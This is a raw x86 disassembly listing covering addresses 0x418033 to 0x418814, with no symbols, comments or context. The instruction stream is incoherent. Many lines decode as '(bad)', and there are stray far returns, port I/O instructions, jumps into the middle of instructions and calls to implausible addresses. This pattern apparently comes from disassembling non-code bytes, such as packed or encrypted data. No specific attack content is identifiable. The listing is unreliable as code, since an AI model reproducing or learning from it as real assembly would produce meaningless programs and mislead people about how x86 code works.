  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
  41863d:	lea    edi,[edi+eax*2]
  418640:	mov    al,0x1
  418642:	jb     0x418644
  418644:	mov    al,0x10
  418646:	push   eax
  418647:	add    al,0x75
  418649:	add    BYTE PTR [ebx],ch
  41864b:	add    ebx,esp
  41864d:	int3   
  41864e:	jne    0x418660
  418650:	movsx  edx,cl
  418653:	add    DWORD PTR [eax],eax
  418655:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  41865c:	mov    gs,edi
  41865e:	add    BYTE PTR [eax-0x50],ch
  418661:	add    al,ch
  418663:	mov    eax,DWORD PTR [ecx]
  418665:	sub    eax,DWORD PTR [eax]
  418667:	jb     0x4186de
  418669:	add    DWORD PTR [esp+eiz*8-0x50],esi
  41866d:	jge    0x418657
  41866f:	add    al,0x1
  418671:	add    DWORD PTR [eax],0x0
  418674:	jne    0x418676
  418676:	je     0x4186bd
  418678:	mov    eax,DWORD PTR [edi]
  41867a:	ror    BYTE PTR [ebp+0x4d],1
  41867d:	or     DWORD PTR [ecx+0x4d03d004],0x3
  418684:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  41868a:	mov    DWORD PTR [ebx],ebp
  41868c:	fadd   DWORD PTR [eax+0x75]
  41868f:	inc    eax
  418690:	pop    eax
  418691:	lea    ebx,[ecx+0x4f]
  418694:	push   0xb1000003
  418699:	out    dx,eax
  41869a:	add    ebp,DWORD PTR [edx+edx*2]
  41869d:	add    BYTE PTR [ebx+ecx*4],bh
  4186a0:	mov    ch,BYTE PTR [ebx]
  4186a2:	jb     0x418716
  4186a4:	add    al,0x89
  4186a6:	push   eax
  4186a7:	call   0x8429d419
  4186ac:	add    DWORD PTR [eax+eax*1],eax
  4186af:	jae    0x4186c5
  4186b1:	icebp  
  4186b2:	inc    ebp
  4186b3:	mov    eax,DWORD PTR gs:[ecx]
  4186b6:	int3   
  4186b7:	out    dx,al
  4186b8:	loopne 0x418707
  4186ba:	sub    eax,DWORD PTR [edx]
  4186bc:	push   0xffffff83
  4186be:	pop    esi
  4186bf:	push   cs
  4186c0:	jl     0x4186db
  4186c2:	add    al,0xaf
  4186c4:	xor    eax,0x832b6d00
  4186c9:	mov    eax,DWORD PTR [edx]
  4186cb:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4186d1:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4186d7:	inc    ebp
  4186d8:	shr    ebx,0x3
  4186db:	or     DWORD PTR [eax],0x4
  4186de:	push   0xffffffa5
  4186e0:	pop    esi
  4186e1:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  4186e8:	jmp    0x418747
  4186ea:	mov    edi,0xff0272
  4186ef:	fdivr  QWORD PTR [ebp+0x5d]
  4186f2:	push   0x4e
  4186f4:	pop    ecx
  4186f5:	call   0x41cafa
  4186fa:	mov    DWORD PTR [ebx],eax
  4186fc:	in     al,0xc8
  4186fe:	rol    BYTE PTR [ebp-0x75],0xc1
  418702:	call   0xab88e3
  418707:	pop    esi
  418708:	enter  0xceff,0x8b
  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
